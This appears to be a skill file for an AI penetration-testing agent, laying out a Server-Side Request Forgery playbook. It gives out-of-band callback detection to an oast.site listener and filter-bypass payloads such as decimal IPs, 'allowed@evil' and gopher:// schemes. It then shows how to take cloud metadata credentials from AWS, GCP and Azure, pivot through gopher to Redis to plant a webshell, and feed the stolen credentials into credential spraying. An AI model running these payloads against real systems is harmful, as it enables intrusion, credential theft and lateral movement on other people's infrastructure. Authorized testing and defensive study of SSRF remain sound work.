---
name: web-ssrf
description: Server-Side Request Forgery detection→internal-access→proof for web apps. Use when the app fetches a URL you influence (webhooks, url/image/pdf fetchers, link preview, import-from-URL, SSO/OIDC redirect, XML/SVG). Triggers - url=/uri=/dest=/callback= param, "fetch failed", webhook, image proxy, /_next/image, remotePatterns, redirect.
tags: [vuln_assess, exploitation]
---

# Server-Side Request Forgery (SSRF)

## When this fires
The server makes an outbound request to a URL/host you can influence: webhook config, image/PDF/link-preview fetchers, import-from-URL, SSO/OIDC callback, image proxies (e.g. Next.js `/_next/image`), XML/SVG parsers.

## Detect
Point it at an OOB listener; a callback from the SERVER's IP confirms SSRF:
```bash
# use interactsh / a collaborator / your own listener
url=http://<OOB-id>.oast.site   # then watch for the server-sourced hit
```
Compare internal vs external: `http://127.0.0.1:<port>` / `http://localhost` responses vs a dead port (differential = internal reachability).

## Decide — filter bypass
- Blocklist of `127.0.0.1`/`localhost` → `http://127.1`, `http://0`, `http://[::1]`, `http://2130706433` (decimal), `http://0x7f000001`, `http://127.0.0.1.nip.io`.
- Allowlist/parser confusion → `http://allowed@evil`, `http://evil#allowed`, `http://allowed.evil.com`, CR/LF + `@`, or a redirect you control (302 → internal).
- Scheme filter → `gopher://` (raw TCP → Redis/SMTP/internal HTTP), `file://`, `dict://`.

## Exploit → PROVE IMPACT
```bash
# cloud metadata (the classic high-impact proof):
http://169.254.169.254/latest/meta-data/iam/security-credentials/      # AWS IMDSv1
# IMDSv2 needs a PUT token first (SSRF must allow method/headers) — else pivot to a v1 target
http://metadata.google.internal/computeMetadata/v1/  (Header Metadata-Flavor: Google)  # GCP
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Header Metadata:true)  # Azure
# internal services: gopher:// to Redis (SLAVEOF/CONFIG SET dir → webshell), unauth admin panels, port-scan via response/timing
```
**Proof required:** exfiltrated cloud creds/metadata, an internal-only page body, or an OOB hit provably from the server. Read creds → add_credential + cred_spray.

## Tooling
`nuclei -tags ssrf`; interactsh/collaborator for OOB; `gopherus` to craft gopher payloads.

## False positives / pitfalls
- Client-side fetch (the BROWSER requests it) = not SSRF.
- WAF returns 200 for everything → rely on the OOB callback / internal-vs-dead-port differential, not the status.
- Egress-filtered target → metadata/OOB may fail though internal pivots still work; try both.
